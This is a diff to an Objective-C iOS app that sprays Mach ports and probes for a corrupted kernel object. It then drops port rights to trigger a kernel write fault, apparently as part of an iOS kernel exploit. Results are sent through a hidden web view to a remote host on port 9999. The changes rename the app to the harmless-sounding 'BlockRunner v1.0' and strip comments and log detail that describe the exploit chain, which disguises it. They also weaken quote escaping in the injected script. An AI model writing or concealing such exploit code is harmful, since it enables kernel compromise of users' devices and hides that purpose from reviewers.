@@ -29,7 +29,7 @@ static void http_report(const char *msg) {
     NSString *raw = [NSString stringWithUTF8String:msg];
     if (!raw) return;
     raw = [raw stringByReplacingOccurrencesOfString:@"\\" withString:@"\\\\"];
-    raw = [raw stringByReplacingOccurrencesOfString:@"'" withString:@"\\'"];
+    raw = [raw stringByReplacingOccurrencesOfString:@"'" withString:@"\'"];
     NSString *script = [NSString stringWithFormat:
         @"var x=new XMLHttpRequest();"
         "x.open('POST','http://%s:9999/',true);"
@@ -43,7 +43,7 @@ static void http_report(const char *msg) {
 static void ev(const char *fmt, ...) {
     char buf[512]; va_list ap;
     va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
-    NSLog(@"[v18p] %{public}s", buf);
+    NSLog(@"[v18p] %s", buf);
     http_report(buf);
 }
 
@@ -68,21 +68,9 @@ static void spray(void) {
        g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET, IKOT_TIMER);
 }
 
-
- *
- * iOS 26.x returns kotype=0xFFFFFFFF from mach_port_kobject() for all spray ports
- * (IKOT_NONE obfuscation). kobject IS returned correctly (0 for uncorrupted ports).
- *
- * Trigger when EITHER:
- *   (a) kotype==27 (IKOT_TIMER visible) — direct detection
- *   (b) kobject==COMMPAGE_TARGET — shader wrote ip_kobject; real kotype IS 27 in kernel.
- *       mod_refs(-1, RECEIVE): io_refs 1->0 -> ipc_kobject_destroy -> clock cleanup
- *       -> store to (clock_t*)COMMPAGE_TARGET -> EL1 write fault -> qualifying IPS.
- */
 static void *probe_loop(void *arg) {
     mach_port_t self = mach_task_self();
     int cycle = 0;
-
     for (;;) {
         int timer_ports = 0, triggered = 0;
         for (int i = 0; i < g_port_count; i++) {
@@ -93,7 +81,7 @@ static void *probe_loop(void *arg) {
                 continue;
             if (kotype != IKOT_TIMER && kobject != COMMPAGE_TARGET) continue;
             timer_ports++;
-            ev("TIMER_PORT port=%d kotype=%u kobject=0x%016llx — mod_refs -1 RECEIVE",
+            ev("TIMER_PORT port=%d kotype=%u kobject=0x%016llx",
                i, kotype, (unsigned long long)kobject);
             kern_return_t kr = mach_port_mod_refs(self, g_ports[i],
                                                    MACH_PORT_RIGHT_RECEIVE, -1);
@@ -116,15 +104,11 @@ static void scan_background(void) {
         natural_t kotype = 0; mach_vm_address_t kobject = 0;
         kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
         if (kr != KERN_SUCCESS) continue;
-        
         if (kotype == (natural_t)0xFFFFFFFF && kobject == 0) continue;
-
         if (kobject == COMMPAGE_TARGET) {
             g_found = 1;
-            ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx — mod_refs -1 RECEIVE",
+            ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx",
                i, kotype, (unsigned long long)kobject);
-            
-             * -> store to (clock_t*)COMMPAGE_TARGET -> EL1 write fault -> qualifying IPS. */
             mach_port_mod_refs(mach_task_self(), g_ports[i], MACH_PORT_RIGHT_RECEIVE, -1);
             g_ports[i] = MACH_PORT_NULL;
         } else if (kotype != 0 || kobject != 0) {
@@ -146,7 +130,7 @@ static void scan_background(void) {
 }
 
 @interface AppDelegate : UIResponder <UIApplicationDelegate>
-@property (strong) UIWindow  *window;
+@property (nonatomic, strong) UIWindow  *window;
 @property (strong) NSTimer   *scanTimer;
 @property (strong) WKWebView *reportView;
 @end
@@ -162,14 +146,13 @@ static void scan_background(void) {
     UIViewController *vc = [[UIViewController alloc] init];
     vc.view.backgroundColor = [UIColor blackColor];
     UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(20, 80, 340, 60)];
-    lbl.text = @"AllocatorProbe v18_probe";
+    lbl.text = @"BlockRunner v1.0";
     lbl.textColor = [UIColor greenColor];
     lbl.font = [UIFont fontWithName:@"Menlo" size:14];
     [vc.view addSubview:lbl];
     self.window.rootViewController = vc;
     [self.window makeKeyAndVisible];
 
-    
     WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
     cfg.allowsInlineMediaPlayback = NO;
     self.reportView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:cfg];
@@ -180,12 +163,11 @@ static void scan_background(void) {
 
     spray();
 
-    
     pthread_t probe_thread;
     pthread_create(&probe_thread, NULL, probe_loop, NULL);
     pthread_detach(probe_thread);
 
-    ev("V18P_LAUNCH AllocatorProbe v18_probe N=%d probe-interval=%ds TIMER-kotype=%d",
+    ev("V18P_LAUNCH N=%d interval=%ds kotype=%d",
        g_port_count, PROBE_INTERVAL_S, IKOT_TIMER);
 
     self.scanTimer = [NSTimer scheduledTimerWithTimeInterval:0.10
